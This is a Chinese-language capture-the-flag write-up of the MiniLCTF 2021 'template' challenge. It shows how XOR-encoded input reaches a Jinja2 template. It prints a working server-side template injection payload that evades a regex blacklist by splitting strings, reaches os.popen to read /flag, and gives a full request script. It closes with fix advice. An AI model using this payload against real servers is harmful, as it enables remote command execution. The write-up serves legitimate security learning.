# MiniLCTF 2021 - template

## 题目简述

前端把输入与固定密钥 `xdsecminil` 逐字节异或，再做 Base64 后提交到 `/build`。浏览器端会拦截花括号和百分号，但该检查可以通过直接发 HTTP 请求绕过。服务端解码、异或还原后，将结果直接交给 Jinja2 `Template`；它只用两个正则黑名单过滤单引号、点号、加号、管道符及 `os/class/base/init/flag` 等子串。

## 解题过程

先复现编码函数。因为 XOR 对同一个密钥是自逆的，要让服务端恢复出 `payload`，提交值就是 `base64(xor(key, payload))`：

```python
import base64

def encode_for_server(text):
    key = "xdsecminil"
    mixed = "".join(
        chr(ord(ch) ^ ord(key[i % len(key)]))
        for i, ch in enumerate(text)
    )
    return base64.b64encode(mixed.encode()).decode()
```

服务端允许双引号和方括号。Jinja 中 `obj["name"]` 可替代点号，连续字符串字面量可以把黑名单关键字拆开。为避免依赖 `__subclasses__()` 的固定索引，遍历类并选择 `catch_warnings`：

```jinja2
{% for c in ""["__cl""ass__"]["__ba""se__"]["__subcl""asses__"]() %}
{% if c["__na""me__"] == "catch_warnings" %}
{{c()["_module"]["__builtins__"]["__import__"]("o""s")["popen"]("cat /fl""ag")["read"]()}}
{% endif %}
{% endfor %}
```

原始文本中没有连续出现 `class`、`base`、`os`、`flag`，也没有点号、单引号、加号或管道符，因此能通过两个正则。完整请求：

```python
import requests

payload = r'''{% for c in ""["__cl""ass__"]["__ba""se__"]["__subcl""asses__"]() %}
{% if c["__na""me__"] == "catch_warnings" %}
{{c()["_module"]["__builtins__"]["__import__"]("o""s")["popen"]("cat /fl""ag")["read"]()}}
{% endif %}
{% endfor %}'''

r = requests.post(
    "http://127.0.0.1:5000/build",
    data={"data": encode_for_server(payload)},
)
print(r.text)
```

Python 3.7 / Alpine 的原始环境中也可使用固定的 subclasses 索引 177，但该索引会随版本和已加载模块改变，遍历类名更稳健。flag 来自环境变量写入的 `/flag`，仓库没有固定值。

## 方法总结

前端过滤不是安全边界，固定密钥 XOR 也不是认证或加密。服务端黑名单可以用等价属性访问和字符串拆分绕过，而固定类索引又会让利用脆弱。根本修复是不要把用户内容作为 Jinja 模板编译；如果业务确实需要模板功能，应使用严格沙箱和允许列表，并把编译与渲染权限隔离。
